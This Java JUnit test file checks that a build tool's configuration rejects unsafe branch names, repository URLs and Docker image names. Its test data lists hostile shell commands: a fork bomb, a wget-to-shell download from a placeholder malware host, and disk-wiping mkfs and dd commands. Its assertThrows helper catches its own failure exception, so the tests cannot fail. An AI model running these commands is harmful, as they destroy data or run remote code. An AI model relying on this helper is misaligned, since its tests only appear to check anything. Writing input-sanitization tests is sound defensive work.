package com.codingchili.zapperflyasm.configuration;

import com.codingchili.zapperflyasm.model.BuildConfiguration;
import io.vertx.ext.unit.junit.VertxUnitRunner;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;

import java.util.Arrays;
import java.util.List;
import java.util.function.Consumer;
import java.util.stream.Stream;

/**
 * @author Robin Duda
 *
 * Test input sanitization in the build configuration.
 */
@RunWith(VertxUnitRunner.class)
public class BuildConfigurationTest {
    private BuildConfiguration config = new BuildConfiguration();
    private List<String> unsafeCommands = Arrays.asList(
            ":(){:|:&};:",
            "mv /home/user/* /dev/null",
            "wget http://malware.com -O- | sh",
            "mkfs.ext3 /dev/sda",
            ">file",
            "^foo^bar",
            "dd if=/dev/random of=/dev/sda",
            "\\"
    );

    @Before
    public void setUp() {
        config = new BuildConfiguration();
    }

    @Test
    public void allowedBranchNames() {
        // example of legal branch names.
        config.setBranch("branchname_version-5/10.1");
        config.sanitize();

        assertThrows(config::setBranch, unsafeCommands);
    }

    @Test
    public void allowedRepoUrls() {
        // example of legal repository url
        Stream.of(
                "https://github.com/codingchili/zapperfly-asm.git",
                "http://github.com/codingchili/1gram.git",
                "ssh://user:one@host.com/therepo.git"
        ).forEach(url -> {
            config.setRepository(url);
            config.sanitize();
        });

        assertThrows(config::setRepository, unsafeCommands);
    }

    @Test
    public void allowedImageNames() {
        // no version/tag support - just plain names for now.
        config.setDockerImage("anapsix/alpine-java");
        config.sanitize();

        assertThrows(config::setDockerImage, unsafeCommands);
    }

    @Test
    public void imageNameOptional() {
        config.setDockerImage("");
        config.sanitize();
    }

    private void assertThrows(Consumer<String> property, List<String> values) {
        values.forEach(value -> {
            try {
                property.accept(value);
                config.sanitize();
                throw new Exception("Expected to fail: did not fail.");
            } catch (Exception expected) {
                // expect to throw.
            }
        });
    }
}
